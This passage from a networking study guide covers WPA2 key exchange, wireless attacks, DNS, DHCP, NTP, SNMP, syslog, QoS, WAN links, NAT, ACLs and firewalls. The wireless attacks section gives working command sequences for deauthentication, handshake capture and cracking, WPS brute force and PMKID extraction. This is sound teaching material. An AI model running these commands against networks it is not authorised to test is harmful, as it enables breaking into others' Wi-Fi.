 |--- EAPOL Key (GTK, MIC) ------>|   AP sends Group Temporal Key
 |<-- EAPOL Key (ACK) ------------|   Client acknowledges

Keys derived:
PTK (Pairwise Temporal Key) = PRF(PMK + ANonce + SNonce + AP-MAC + Client-MAC)
```

**Key hierarchy:**
- **PSK/PMK (Pairwise Master Key):** Derived from passphrase or 802.1X
- **PTK (Pairwise Temporal Key):** Per-session unicast encryption key
- **GTK (Group Temporal Key):** Multicast/broadcast encryption key

---

## 6.5 Wireless Attacks

### Passive Attacks (Eavesdropping)
- **Packet sniffing:** Use monitor mode NIC + Wireshark/tcpdump
- Monitor mode captures all 802.11 frames (data, management, control)
- **Evil twin / Rogue AP:** Create fake AP with same SSID — clients connect thinking it's legitimate

### Active Attacks

**Deauthentication Attack:**
- 802.11 management frames not authenticated in WPA2
- Send forged deauth frames (spoofing AP MAC) → clients disconnect
- Force reauthentication → capture 4-way handshake for offline cracking
```bash
aireplay-ng --deauth 10 -a [AP-MAC] -c [Client-MAC] wlan0mon
```

**WPA2 Handshake Capture + Offline Crack:**
```bash
airmon-ng start wlan0                              # Enable monitor mode
airodump-ng wlan0mon                               # Scan for networks
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon  # Capture on channel 6
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon  # Deauth clients to capture handshake
aircrack-ng -w rockyou.txt capture*.cap           # Crack offline
hashcat -m 22000 capture.hccapx rockyou.txt       # GPU crack
```

**WPS Attacks:**
- WPS PIN is 8 digits → effectively 11,000 combinations (split auth allows 10^4 + 10^3 tests)
- Pixie dust attack exploits weak WPS implementations
- **Reaver:** WPS PIN brute force tool
```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
```

**PMKID Attack (hashcat-new, no deauth needed):**
- Extract PMKID from first EAPOL frame (no full handshake needed)
```bash
hcxdumptool -i wlan0mon -o output.pcapng --enable_status=1
hcxpcapngtool output.pcapng -o hashes.txt
hashcat -m 22000 hashes.txt wordlist.txt
```

**Evil Twin / Karma Attack:**
- Create AP with same SSID as legitimate network
- Clients auto-connect if signal is stronger
- Tools: hostapd-wpe, airbase-ng, WiFi Pineapple

**Wardriving:**
- Driving with wireless adapter scanning for networks
- Tools: Kismet, WiGLE, NetStumbler (legacy)

---

## 6.6 Wireless Infrastructure Configuration

### Cisco Wireless LAN Controller (WLC)

```
WLC concepts:
- LAP (Lightweight AP): Controlled by WLC
- CAPWAP: Control And Provisioning of Wireless Access Points
  - UDP 5246: CAPWAP control channel
  - UDP 5247: CAPWAP data channel
- FlexConnect: LAP operates independently if WLC connection lost
- Local mode: All traffic tunneled to WLC
```

### Wireless Network Design

**Channel planning (2.4 GHz):**
- Assign channels 1, 6, 11 to adjacent APs
- No adjacent APs on overlapping channels

**Cell sizing:**
- Overlap of 15-20% between cells for seamless roaming
- Reduce power to prevent too much overlap

**AP placement:**
- Mount high (ceiling preferred)
- Away from metal objects and microwaves
- Consider building materials

**High-density environments:**
- More APs with lower power (smaller cells)
- Use 5 GHz primarily (more channels)
- Enable BSS coloring (802.11ax) to reuse channels

---

## 6.7 Other Wireless Technologies

### Bluetooth (IEEE 802.15.1)
- Short range (~10m, Class 2; up to 100m, Class 1)
- 2.4 GHz band — 79 channels, 1 MHz each
- Uses **FHSS (Frequency Hopping Spread Spectrum)** — 1600 hops/second
- **Versions:**
  - Bluetooth 4.0/BLE: Low Energy — IoT, beacons
  - Bluetooth 5.0: 2× speed, 4× range of BLE, 8× broadcast capacity
- **Piconet:** One master, up to 7 active slaves
- **Scatternet:** Overlapping piconets

**Bluetooth attacks:**
- **Bluejacking:** Send unsolicited messages to Bluetooth devices
- **Bluesnarfing:** Unauthorized access to data (contacts, calendar) — exploits OBEX
- **Bluebugging:** Take control of device (calls, messages)
- **BlueBorne:** Attack via Bluetooth without pairing (RCE, MITM)

### NFC (Near Field Communication)
- Extremely short range (< 4 cm)
- 13.56 MHz
- 106–424 Kbps
- Uses: contactless payment, transit cards, smart tags
- **NFC attacks:** Eavesdropping (possible at short distance), relay attacks

### Zigbee (IEEE 802.15.4)
- Low-power, low-data-rate mesh network
- 2.4 GHz (16 channels) or 868/915 MHz
- Range: 10–100m per hop; mesh extends range
- Used for: smart home (lights, thermostats, sensors), industrial IoT

### Z-Wave
- Similar to Zigbee — home automation
- 908.42 MHz (US) — less interference than 2.4 GHz
- Range: ~30m per hop; mesh

### WiMAX (IEEE 802.16)
- Broadband wireless for wide-area (MAN/WAN)
- Range: Up to 50 km
- Up to 70 Mbps
- Largely replaced by LTE

### Cellular Networks
- **LTE (Long-Term Evolution) / 4G:** 100 Mbps+ downlink; uses OFDMA
- **LTE-A (LTE-Advanced):** Carrier aggregation; 1 Gbps+
- **5G NR (New Radio):** Sub-6 GHz and mmWave (24+ GHz)
  - **Sub-6 GHz:** Similar range to LTE; 1–10 Gbps
  - **mmWave (FR2):** Extremely high speed (up to 20 Gbps) but very short range (<300m), blocked by buildings
- **CBRS (Citizens Broadband Radio Service):** 3.5 GHz private LTE for enterprise

---
# SECTION 7: Network Services and WAN Technologies

---

## 7.1 DNS Deep Dive

### DNS Architecture

DNS is a **distributed, hierarchical** database. No single server holds all records — queries are delegated through the hierarchy.

**DNS hierarchy:**
```
.                          ← Root zone (13 root server clusters)
├── com.
│   ├── example.com.       ← Authoritative for example.com
│   └── google.com.
├── org.
│   └── wikipedia.org.
└── net.
```

**Root servers:** 13 logical clusters (A through M) operated by different organizations. Distributed via anycast — actually hundreds of physical servers.
- a.root-servers.net (VeriSign)
- b.root-servers.net (USC-ISI)
- f.root-servers.net (Internet Systems Consortium)

**DNS resolver types:**
- **Stub resolver:** Client's built-in resolver (just queries the configured DNS server)
- **Recursive resolver:** Does the full lookup work on behalf of clients (ISP DNS, 8.8.8.8)
- **Authoritative server:** Has the actual records for a domain; answers with authority
- **Forwarder:** Passes queries to another server (forwarding DNS)

### DNS Query Types

**Recursive query:** Client asks resolver to do all the work and return the final answer.

**Iterative query:** Resolver asks each server in turn, getting referrals until it finds the authoritative server.

**Reverse lookup:** IP address → hostname. Uses PTR records in the `in-addr.arpa.` domain.
```
IP: 192.168.1.100
Reverse zone: 1.168.192.in-addr.arpa.
PTR record: 100.1.168.192.in-addr.arpa. → host.example.com.
```

### DNS Caching and TTL

- **TTL (Time to Live):** How long records can be cached (in seconds)
- Short TTL: Frequent updates, slower resolution (more queries)
- Long TTL: Fewer queries but slower propagation of changes
- Typical: 300 (5 min) to 86400 (24 hours) for production; lower during migrations

**Negative caching:** Cache "record not found" responses (TTL from SOA MINIMUM field)

**Local hosts file:** `/etc/hosts` (Linux) or `C:\Windows\System32\drivers\etc\hosts` (Windows) — checked before DNS; overrides DNS

### DNS Record Types (Complete)

| Record | Description | Example |
|--------|-------------|---------|
| **A** | IPv4 address | `www.example.com. A 93.184.216.34` |
| **AAAA** | IPv6 address | `www.example.com. AAAA 2606:2800::1` |
| **CNAME** | Canonical name (alias) | `www.example.com. CNAME example.com.` |
| **MX** | Mail exchanger (priority, server) | `example.com. MX 10 mail.example.com.` |
| **NS** | Authoritative nameserver | `example.com. NS ns1.example.com.` |
| **SOA** | Start of Authority (zone info) | Serial, refresh, retry, expire, minimum TTL |
| **PTR** | Pointer for reverse DNS | `34.216.184.93.in-addr.arpa. PTR example.com.` |
| **TXT** | Text records | SPF, DKIM, domain verification |
| **SRV** | Service locator | `_sip._tcp.example.com. SRV 0 5 5060 sip.example.com.` |
| **CAA** | CA Authorization | Restricts which CAs can issue certs |
| **DNSKEY** | DNSSEC public key | Zone signing key |
| **DS** | Delegation Signer | Trust anchor for child zone (DNSSEC) |
| **RRSIG** | DNSSEC signature | Signs a set of records |
| **NAPTR** | Naming Authority Pointer | ENUM, SIP |
| **TLSA** | TLS certificate association (DANE) | |
| **SSHFP** | SSH fingerprint | |

### DNS Security

**DNS Cache Poisoning / DNS Spoofing:**
- Inject false DNS records into resolver cache
- Victim queries resolver → resolver has poisoned entry → victim goes to attacker server
- **Kaminsky attack (2008):** Exploited predictable transaction IDs to poison resolvers at scale
- **Fix:** Randomize source ports and transaction IDs; use DNSSEC

**DNSSEC (DNS Security Extensions):**
- Digitally signs DNS records — verifies authenticity and integrity
- Does NOT encrypt DNS traffic
- Zone signing: RRSIG records sign each RRset
- Chain of trust: from root → TLD → domain

**DoT (DNS over TLS):** Port 853 — encrypts DNS traffic
**DoH (DNS over HTTPS):** Port 443 — DNS within HTTPS (harder to block/inspect)
**DoQ (DNS over QUIC):** Newer — DNS over QUIC protocol

**Split DNS / Split-brain DNS:**
- Internal clients get internal IPs; external clients get public IPs for same hostname
- Two DNS servers (or views) with different answers for same zone

### DNS Troubleshooting Commands

```bash
# nslookup (Windows/Linux)
nslookup example.com                     # Basic A lookup
nslookup -type=MX example.com            # MX records
nslookup -type=NS example.com            # NS records
nslookup example.com 8.8.8.8             # Use specific DNS server

# dig (Linux/Mac)
dig example.com                          # A record
dig example.com MX                       # MX records
dig example.com NS                       # NS records
dig example.com ANY                      # All records
dig +short example.com                   # Short output (just IP)
dig @8.8.8.8 example.com                 # Query specific server
dig -x 93.184.216.34                     # Reverse lookup
dig +trace example.com                   # Full delegation trace
dig example.com +dnssec                  # DNSSEC validation
dig example.com +nocmd +noall +answer    # Clean answer section only

# host (Linux)
host example.com
host -t MX example.com

# Windows
Resolve-DnsName example.com -Type MX -Server 8.8.8.8
ipconfig /displaydns                     # Show DNS cache
ipconfig /flushdns                       # Clear DNS cache
```

---

## 7.2 DHCP Deep Dive

### DHCP Lease Process Detail

```
Client (no IP)                        DHCP Server
     |                                     |
     |-- DHCPDISCOVER (broadcast) -------->|  "I need an IP"
     |   src: 0.0.0.0:68                   |
     |   dst: 255.255.255.255:67           |
     |                                     |
     |<- DHCPOFFER (broadcast/unicast) ----|  "Use 192.168.1.50"
     |   src: 192.168.1.1:67              |
     |   Offered IP: 192.168.1.50         |
     |   Lease time: 86400s               |
     |                                     |
     |-- DHCPREQUEST (broadcast) --------->|  "I want 192.168.1.50"
     |   (broadcast so other servers       |
     |    know this offer was accepted)    |
     |                                     |
     |<- DHCPACK (broadcast/unicast) ------|  "Confirmed, 192.168.1.50 is yours"
     |                                     |
     |=== Client configures 192.168.1.50 ==|
```

**Lease renewal:**
- At 50% of lease time: Client sends DHCPREQUEST directly to server (unicast)
- At 87.5% of lease time: Client broadcasts DHCPREQUEST (if server didn't respond)
- At 100%: Client must stop using IP and start over

**DHCPRELEASE:** Client tells server it's done with IP (when cleanly shutting down)
**DHCPDECLINE:** Client found IP is already in use (after ARP check) — declines it
**DHCPINFORM:** Client has static IP but wants other options (DNS, NTP) from server
**DHCPNAK:** Server tells client it can't have requested IP (wrong subnet, expired binding)

### DHCP Server Configuration (ISC DHCP)

```
# /etc/dhcp/dhcpd.conf

# Global options
option domain-name "example.com";
option domain-name-servers 8.8.8.8, 8.8.4.4;
default-lease-time 86400;     # 24 hours
max-lease-time 172800;        # 48 hours

# Subnet declaration
subnet 192.168.1.0 netmask 255.255.255.0 {
  range 192.168.1.100 192.168.1.200;
  option routers 192.168.1.1;
  option subnet-mask 255.255.255.0;
  option broadcast-address 192.168.1.255;
  option domain-name-servers 192.168.1.1;
  option ntp-servers 192.168.1.1;
}

# Static reservation (by MAC address)
host printer01 {
  hardware ethernet 00:11:22:33:44:55;
  fixed-address 192.168.1.50;
  option host-name "printer01";
}
```

### DHCP Snooping (Network Security)

- Switch feature that validates DHCP messages
- Prevents **rogue DHCP servers** from assigning incorrect IPs to clients
- Builds a **DHCP binding table** (MAC → IP → VLAN → port)
- Used by DAI (Dynamic ARP Inspection) and IPSG

```cisco
ip dhcp snooping
ip dhcp snooping vlan 10,20,30
no ip dhcp snooping information option   ! Remove option 82 if causing issues

interface GigabitEthernet0/24            ! Uplink to real DHCP server
 ip dhcp snooping trust

show ip dhcp snooping
show ip dhcp snooping binding
show ip dhcp snooping statistics
```

---

## 7.3 NTP (Network Time Protocol)

Synchronizes clocks across network devices. Critical for logging, security certificates, Kerberos authentication, and digital signatures.

**Port:** UDP 123

**Stratum levels:**
- **Stratum 0:** Reference clocks (atomic clocks, GPS, radio clocks) — NOT on network
- **Stratum 1:** Directly synchronized to stratum 0 (primary time servers)
- **Stratum 2:** Synchronized to stratum 1
- **Stratum 15:** Last usable stratum
- **Stratum 16:** Unsynchronized (clock not trusted)

**NTP accuracy:**
- Over internet: ~10 ms
- Over LAN: < 1 ms
- With GPS: < 1 µs

**NTP modes:**
- **Client/server:** Client requests time from server
- **Peer:** Two servers synchronize with each other (equal relationship)
- **Broadcast:** Server broadcasts; clients listen (not recommended — no authentication)

**NTPv3 vs NTPv4:**
- NTPv4: More accurate, better security, IPv6 support

**PTP (Precision Time Protocol, IEEE 1588):**
- Microsecond accuracy (vs milliseconds for NTP)
- Used in financial trading, manufacturing, telecom

```cisco
! Cisco NTP configuration
Router(config)# ntp server 0.pool.ntp.org
Router(config)# ntp server 1.pool.ntp.org prefer
Router(config)# ntp update-calendar                ! Sync hardware clock
Router(config)# ntp authenticate
Router(config)# ntp authentication-key 1 md5 NTPsecret
Router(config)# ntp trusted-key 1

Router# show ntp status
Router# show ntp associations
Router# show clock detail
```

```bash
# Linux NTP
timedatectl status
timedatectl set-ntp true
systemctl status systemd-timesyncd
ntpq -p                        # Show NTP peers and status
chronyc tracking               # chrony status
chronyc sources -v             # chrony sources
```

---

## 7.4 SNMP (Simple Network Management Protocol)

SNMP manages and monitors network devices. Collects metrics, alerts on events, and can change configuration.

**Port:** UDP 161 (queries), UDP 162 (traps)

**Components:**
- **Manager (NMS):** Network Management System — polls agents, receives traps (Cacti, PRTG, SolarWinds)
- **Agent:** Software on managed device — responds to queries, sends traps
- **MIB (Management Information Base):** Database defining manageable objects
- **OID (Object Identifier):** Dot-notation address for each MIB object

**Example OIDs:**
```
1.3.6.1.2.1.1.1.0   = sysDescr (system description)
1.3.6.1.2.1.1.3.0   = sysUpTime
1.3.6.1.2.1.2.2     = interfaces table
1.3.6.1.2.1.25.3.3  = hrProcessorLoad
```

### SNMP Versions

| Version | Security | Notes |
|---------|----------|-------|
| **SNMPv1** | Community string (plaintext) | Original; avoid |
| **SNMPv2c** | Community string (plaintext) | Improved bulk transfer; still plaintext auth |
| **SNMPv3** | MD5/SHA auth + AES/DES encryption | **Use this in production** |

**SNMPv2c Community strings:**
- **Read-only (ro):** "public" — poll data only
- **Read-write (rw):** "private" — poll and change settings
- Change default community strings! They are essentially passwords.

**SNMPv3 Security Levels:**
- **noAuthNoPriv:** No authentication, no encryption
- **authNoPriv:** MD5/SHA authentication, no encryption
- **authPriv:** MD5/SHA authentication + DES/AES encryption (use this)

### SNMP Operations

| Operation | Direction | Description |
|-----------|-----------|-------------|
| **Get** | Manager → Agent | Get single OID value |
| **GetNext** | Manager → Agent | Get next OID in tree |
| **GetBulk** | Manager → Agent | Get multiple OIDs efficiently (v2c+) |
| **Set** | Manager → Agent | Change OID value |
| **Trap** | Agent → Manager | Unsolicited notification (no ACK) |
| **Inform** | Agent → Manager | Trap with acknowledgment (v2c+) |
| **Response** | Agent → Manager | Reply to Get/Set |

```cisco
! Cisco SNMPv3 configuration
Router(config)# snmp-server group MONITORING v3 priv
Router(config)# snmp-server user monuser MONITORING v3 auth sha AuthPass priv aes 128 PrivPass
Router(config)# snmp-server host 192.168.1.10 version 3 priv monuser
Router(config)# snmp-server enable traps

! Legacy SNMPv2c (change community strings!)
Router(config)# snmp-server community Str0ngR0C v1 ro
Router(config)# snmp-server community Str0ngRW v1 rw
Router(config)# snmp-server host 192.168.1.10 version 2c Str0ngR0C

Router# show snmp
Router# show snmp user
Router# show snmp group
```

---

## 7.5 Syslog

Standard protocol for sending log messages from devices to a central log server.

**Port:** UDP 514 (traditional), TCP 514 or 6514 (TLS)

### Syslog Severity Levels (0–7)

| Level | Name | Description | Memory Aid |
|-------|------|-------------|-----------|
| 0 | **Emergency** | System unusable | Emergencies |
| 1 | **Alert** | Immediate action needed | Always |
| 2 | **Critical** | Critical conditions | Cause |
| 3 | **Error** | Error conditions | Errors |
| 4 | **Warning** | Warning conditions | Whenever |
| 5 | **Notice** | Normal but significant | Normal |
| 6 | **Informational** | Information messages | Information |
| 7 | **Debug** | Debug-level details | Debugs |

Mnemonic: **"Every Awesome Cisco Engineer Will Need Ice Daily"**

### Syslog Facilities

Categories of log source:
- **kern (0):** Kernel messages
- **user (1):** User-level messages
- **mail (2):** Mail system
- **daemon (3):** System daemons
- **auth (4):** Security/auth messages
- **syslog (5):** Syslog daemon
- **local0–7 (16–23):** Locally defined — commonly used for network devices

**Cisco syslog configuration:**
```cisco
Router(config)# logging 192.168.1.20           ! Syslog server IP
Router(config)# logging trap informational     ! Send info and above to server
Router(config)# logging buffered 65536 debugging ! Local buffer
Router(config)# service timestamps log datetime msec
Router(config)# logging source-interface Loopback0

Router# show logging
```

**Popular syslog servers:**
- **rsyslog/syslog-ng:** Linux open-source
- **Graylog:** Open-source with web UI
- **Splunk:** Enterprise — also SIEM
- **ELK Stack:** Elasticsearch + Logstash + Kibana
- **SIEM:** Security Information and Event Management (correlates logs)

---

## 7.6 QoS (Quality of Service)

QoS prioritizes certain types of traffic to ensure performance for time-sensitive applications (VoIP, video conferencing).

### Why QoS?

Problems QoS solves:
- **Delay (latency):** Time for packet to reach destination
- **Jitter:** Variation in delay (critical for VoIP — causes choppy audio)
- **Packet loss:** Dropped packets cause retransmission (TCP) or gaps (UDP/VoIP)
- **Bandwidth:** Insufficient bandwidth causes congestion

**VoIP requirements:**
- Delay: < 150 ms one-way
- Jitter: < 30 ms
- Packet loss: < 1%

### QoS Models

**Best Effort (default):** No QoS — all packets treated equally. FIFO queuing.

**IntServ (Integrated Services):**
- Per-flow reservation using RSVP (Resource Reservation Protocol)
- Strong guarantees but doesn't scale (state per flow)

**DiffServ (Differentiated Services):**
- Mark packets and treat classes differently
- Scales well — most widely deployed model

### DiffServ Markings

**DSCP (Differentiated Services Code Point):** 6 bits in IP header TOS field
- 64 possible values (0–63)

**Per-Hop Behaviors (PHBs):**

| PHB | DSCP | Value | Use |
|-----|------|-------|-----|
| **Default (BE)** | 000000 | 0 | Best effort |
| **EF (Expedited Forwarding)** | 101110 | 46 | Voice — lowest delay, jitter, loss |
| **AF11** | 001010 | 10 | |
| **AF12** | 001100 | 12 | Low priority data |
| **AF13** | 001110 | 14 | |
| **AF21** | 010010 | 18 | |
| **AF22** | 010100 | 20 | Medium priority data |
| **AF23** | 010110 | 22 | |
| **AF31** | 011010 | 26 | |
| **AF32** | 011100 | 28 | High priority data |
| **AF33** | 011110 | 30 | |
| **AF41** | 100010 | 34 | |
| **AF42** | 100100 | 36 | Video |
| **AF43** | 100110 | 38 | |
| **CS1–CS7** | x01000 | 8,16,24,32,40,48,56 | Class Selector (legacy IPP compat) |

**CoS (Class of Service):** 802.1p 3-bit field in 802.1Q Ethernet header (Layer 2 marking)
- 0–7; maps to DSCP for QoS consistency across L2 and L3

### QoS Mechanisms

**Classification:** Identify traffic type
- ACL match, DSCP/CoS value, NBAR (application-aware), deep packet inspection

**Marking:** Set DSCP/CoS value
- Mark as close to the source as possible ("trust boundary")
- Don't trust markings from end users — remark at switch

**Queuing:** Hold packets in priority queues:
- **FIFO:** First in, first out — no priority
- **PQ (Priority Queuing):** 4 queues; high priority always served first — can starve others
- **WFQ (Weighted Fair Queuing):** Fair but weighted; low bandwidth flows get proportional service
- **CBWFQ (Class-Based WFQ):** Assign bandwidth % to classes
- **LLQ (Low Latency Queuing):** CBWFQ + strict priority queue for voice — best for VoIP

**Scheduling:** How queues are served:
- Strict priority: High queue always first
- Round-robin: Each queue served in turn
- Weighted round-robin: Proportional to weights

**Shaping:** Delay excess traffic to conform to rate limit (smooth/buffer)
- Traffic is buffered and sent later
- Introduces delay; prevents upstream drops

**Policing:** Drop or re-mark excess traffic (harder enforcement)
- Traffic over limit is dropped or re-marked to lower DSCP
- No buffering — drops immediately

**Congestion avoidance (WRED — Weighted Random Early Detection):**
- Randomly drop packets before queue fills up
- Drop lower-priority traffic more aggressively
- Prevents TCP synchronization (global synchronization)

```cisco
! Cisco QoS with MQC (Modular QoS CLI)
! Step 1: Class-maps (identify traffic)
Router(config)# class-map match-any VOICE
Router(config-cmap)# match dscp ef                ! EF marked traffic
Router(config)# class-map match-any VIDEO
Router(config-cmap)# match dscp af41 af42 af43

! Step 2: Policy-map (what to do with each class)
Router(config)# policy-map WAN-POLICY
Router(config-pmap)# class VOICE
Router(config-pmap-c)# priority 512               ! LLQ — 512 Kbps strict priority
Router(config-pmap-c)# class VIDEO
Router(config-pmap-c)# bandwidth percent 30       ! 30% bandwidth guarantee
Router(config-pmap-c)# class class-default
Router(config-pmap-c)# fair-queue                 ! WFQ for the rest

! Step 3: Service-policy (apply to interface)
Router(config)# interface Serial0/0
Router(config-if)# service-policy output WAN-POLICY

Router# show policy-map interface Serial0/0
Router# show class-map
```

---

## 7.7 WAN Technologies

### Leased Lines

**T-carrier (North America):**
- **T1:** 1.544 Mbps, 24 DS0 channels (each 64 Kbps)
- **T3:** 44.736 Mbps (28 T1s)
- **Fractional T1:** Subset of T1 channels

**E-carrier (Europe):**
- **E1:** 2.048 Mbps, 32 channels
- **E3:** 34.368 Mbps (16 E1s)

**OC (Optical Carrier) / SONET:**
- **OC-1:** 51.84 Mbps
- **OC-3:** 155.52 Mbps
- **OC-12:** 622.08 Mbps
- **OC-48:** 2.488 Gbps
- **OC-192:** 9.953 Gbps

### DSL (Digital Subscriber Line)

Uses existing telephone copper pairs. **Distance-limited** (quality degrades with distance from CO).

| Type | Down | Up | Notes |
|------|------|----|-------|
| ADSL | 8 Mbps | 1 Mbps | Asymmetric; most common consumer |
| ADSL2+ | 24 Mbps | 3.5 Mbps | Extended ADSL |
| VDSL | 52 Mbps | 16 Mbps | Very short distance |
| VDSL2 | 200 Mbps | 100 Mbps | Even shorter distance |
| G.fast | 1 Gbps | 500 Mbps | Very short (< 100m) |

**CPE (Customer Premises Equipment):** DSL modem + router

### Cable Internet (DOCSIS)

Uses coaxial TV cable infrastructure.
- **DOCSIS 3.0:** Up to 1 Gbps down, 200 Mbps up
- **DOCSIS 3.1:** Up to 10 Gbps down, 1 Gbps up
- **DOCSIS 4.0:** Full duplex — symmetrical multi-Gbps

### Fiber (FTTH/FTTP)

- **GPON (Gigabit Passive Optical Network):** 2.5 Gbps down, 1.25 Gbps up, shared among 32–128 users
- **XGS-PON:** 10 Gbps symmetrical
- **EPON:** Ethernet-based PON

### MPLS (Multiprotocol Label Switching)

MPLS is not a routing protocol — it's a **forwarding mechanism** that uses **labels** instead of IP addresses.

**How MPLS works:**
1. **Ingress LSR (Label Edge Router):** Adds a label to incoming packet
2. **Transit LSR (P router):** Forwards based on label (no IP lookup!) — very fast
3. **Egress LSR:** Removes label, forwards based on IP

**Label format (4 bytes):**
```
| Label (20 bits) | Exp/TC (3 bits) | S (1 bit) | TTL (8 bits) |
```
- **Label:** Forwarding identifier
- **Exp/TC:** Traffic Class (QoS)
- **S (Bottom of Stack):** 1 = last label in stack
- **TTL:** Prevent loops

**MPLS benefits:**
- Fast forwarding (label lookup faster than IP routing)
- Traffic engineering (explicit path control)
- QoS support via Exp bits
- VPN support (MPLS VPN — L2VPN and L3VPN)

**MPLS VPN:**
- **L3VPN:** PE router participates in customer routing; uses VRF (Virtual Routing and Forwarding) to separate customers
- **L2VPN/VPLS:** Extends customer Layer 2 across MPLS backbone (customers see it as a single LAN)

**LDP (Label Distribution Protocol):** Distributes label-to-FEC (Forwarding Equivalence Class) bindings between LSRs
**RSVP-TE:** Traffic engineering — explicitly routes LSPs (Label Switched Paths)

### SD-WAN (Software-Defined WAN)

Software-defined approach to managing WAN connections:
- Central controller manages all WAN routers/appliances
- Abstract underlying transport (MPLS, internet, LTE, satellite)
- Dynamic path selection based on application and network conditions
- Zero-touch provisioning
- Centralized policy and visibility

**Benefits over traditional WAN:**
- Use cheap internet links alongside expensive MPLS
- Application-aware routing (Office365 goes direct to internet, SAP goes via MPLS)
- Automated failover between links
- Centralized management
- Better visibility and analytics

**Vendors:** Cisco Viptela, VMware VeloCloud, Silver Peak, Fortinet, Palo Alto Prisma SD-WAN

### Cellular WAN (LTE/5G)

- Used for backup WAN or primary connection where fiber/cable unavailable
- **LTE:** 50–150 Mbps typical; latency ~30–50ms
- **5G Sub-6 GHz:** 100–900 Mbps; latency ~10–20ms
- **5G mmWave:** Multi-Gbps; very short range; latency ~1ms
- Requires SIM card and cellular plan

### Satellite

- Useful where terrestrial options unavailable (rural, maritime, aviation)
- **GEO (Geostationary):** 35,786 km altitude; ~600ms latency (problematic for VoIP/gaming)
  - Viasat, HughesNet
- **LEO (Low Earth Orbit):** 550–1200 km; ~20ms latency; requires more satellites
  - **Starlink:** SpaceX; 150–500 Mbps; 20–40ms latency; rapidly expanding
  - OneWeb, Amazon Kuiper

---

## 7.8 NAT Configuration (Cisco)

```cisco
! Define inside and outside interfaces
Router(config)# interface GigabitEthernet0/0          ! LAN
Router(config-if)# ip nat inside
Router(config-if)# interface GigabitEthernet0/1       ! WAN/Internet
Router(config-if)# ip nat outside

! PAT (overload) — most common
Router(config)# access-list 1 permit 192.168.1.0 0.0.0.255
Router(config)# ip nat inside source list 1 interface GigabitEthernet0/1 overload

! Static NAT (one-to-one)
Router(config)# ip nat inside source static 192.168.1.10 203.0.113.10

! Static PAT (port forwarding) — forward port 80 to internal web server
Router(config)# ip nat inside source static tcp 192.168.1.20 80 203.0.113.1 80

! Dynamic NAT with pool
Router(config)# ip nat pool PUBLIC-IPS 203.0.113.10 203.0.113.20 netmask 255.255.255.0
Router(config)# ip nat inside source list 1 pool PUBLIC-IPS

! Verification
Router# show ip nat translations
Router# show ip nat translations verbose
Router# show ip nat statistics
Router# debug ip nat
```

---
# SECTION 8: Network Security

---

## 8.1 Access Control Lists (ACLs)

ACLs are ordered lists of permit/deny rules applied to router or switch interfaces. They filter traffic based on IP addresses, protocols, and port numbers.

### ACL Types (Cisco)

**Standard ACL (1–99, 1300–1999):**
- Matches source IP address only
- Apply close to the **destination** (to avoid blocking legitimate traffic)

**Extended ACL (100–199, 2000–2699):**
- Matches source IP, destination IP, protocol, source port, destination port
- Apply close to the **source** (block traffic early)

**Named ACL:**
- More descriptive, easier to edit (can add/remove individual entries)
- Can be standard or extended

### ACL Rules and Logic

- **Processed top-down:** First match wins
- **Implicit deny:** Every ACL ends with an invisible `deny any` — if nothing matches, packet is denied
- **Wildcards:** Used in ACLs (inverse of subnet mask): 0 = must match, 1 = ignore
  - `0.0.0.0` = host (must match all bits)
  - `0.0.0.255` = match any host in that /24
  - `255.255.255.255` = any (all bits ignored)

### Standard ACL Configuration

```cisco
! Numbered standard ACL
Router(config)# access-list 10 permit 192.168.1.0 0.0.0.255
Router(config)# access-list 10 deny any

! Apply to interface
Router(config)# interface GigabitEthernet0/1
Router(config-if)# ip access-group 10 in      ! Filter incoming traffic
Router(config-if)# ip access-group 10 out     ! Filter outgoing traffic

! Named standard ACL
Router(config)# ip access-list standard BLOCK-GUESTS
Router(config-std-nacl)# permit 10.0.1.0 0.0.0.255
Router(config-std-nacl)# deny any log
```

### Extended ACL Configuration

```cisco
! Numbered extended ACL
Router(config)# access-list 101 permit tcp 192.168.1.0 0.0.0.255 any eq 80
Router(config)# access-list 101 permit tcp 192.168.1.0 0.0.0.255 any eq 443
Router(config)# access-list 101 permit udp any any eq 53
Router(config)# access-list 101 deny ip any any log

! Named extended ACL
Router(config)# ip access-list extended WAN-INBOUND
Router(config-ext-nacl)# 10 deny ip 10.0.0.0 0.255.255.255 any      ! Block RFC1918 from internet
Router(config-ext-nacl)# 20 deny ip 172.16.0.0 0.15.255.255 any
Router(config-ext-nacl)# 30 deny ip 192.168.0.0 0.0.255.255 any
Router(config-ext-nacl)# 40 permit tcp any host 203.0.113.10 eq 80   ! Allow web traffic to server
Router(config-ext-nacl)# 50 permit tcp any host 203.0.113.10 eq 443
Router(config-ext-nacl)# 60 permit icmp any any echo-reply            ! Allow ping replies back in
Router(config-ext-nacl)# 70 deny ip any any log

! Common ACL keywords
permit tcp any any established   ! Allow established TCP sessions (return traffic)
permit icmp any any echo-reply   ! Allow ping replies
permit udp any any gt 1023       ! Allow high ports (established UDP)
deny ip any any log              ! Explicit deny with logging

! Verification
Router# show access-lists
Router# show ip access-lists
Router# show interfaces GigabitEthernet0/0 | include access list
Router# show ip interface GigabitEthernet0/0 | include access list
```

### ACL Best Practices

- **Most specific first:** Put narrow rules before broad ones
- **Standard ACLs:** Apply near destination
- **Extended ACLs:** Apply near source (save bandwidth)
- **Always include explicit deny with log** to track blocked traffic
- **Use named ACLs:** Easier to manage and modify
- **Document:** Comment your ACLs
- **Use `established` for return TCP traffic** (avoids complex permit rules)

---

## 8.2 Firewall Deep Dive

### Packet Filtering (Stateless)

- Examines each packet independently
- Rules based on: source/destination IP, source/destination port, protocol
- Fast but limited intelligence — can't track connections
- **Doesn't understand relationships** — must permit return traffic explicitly

### Stateful Inspection

- **Tracks TCP/UDP connection state** in a state table
- Automatically permits return traffic for established sessions
- **State table entry:** Source IP, Dest IP, Source Port, Dest Port, Protocol, Connection state
- TCP states tracked: SYN → SYN-ACK → ESTABLISHED → FIN → CLOSED

```
State table example:
Src IP      Src Port  Dst IP     Dst Port  Proto  State
192.168.1.5  54321    8.8.8.8    53        UDP    Established
192.168.1.5  49152    93.184.216.34  80    TCP    Established
```

### Application Layer Inspection (Deep Packet Inspection)

- Understands application-layer protocols
- Can detect:
  - HTTP tunneling over port 80
  - Protocol anomalies (valid port but wrong protocol)
  - Specific application traffic (YouTube, Skype) regardless of port
- Required for: IPS signatures, URL filtering, SSL inspection

